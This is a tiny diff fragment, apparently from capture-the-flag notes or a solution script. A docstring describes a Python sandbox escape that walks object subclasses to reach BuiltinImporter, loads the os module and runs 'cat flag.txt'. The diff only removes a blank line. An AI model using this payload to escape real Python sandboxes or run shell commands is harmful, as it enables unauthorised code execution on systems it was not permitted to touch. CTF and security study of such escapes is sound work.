@@ -18,4 +18,3 @@ for i,j in enumerate(x):
 3. find index of <class '_frozen_importlib.BuiltinImporter'>
 ().__class__.__mro__[1].__subclasses__()[120]().load_module('os').system('cat flag.txt')
 """
-
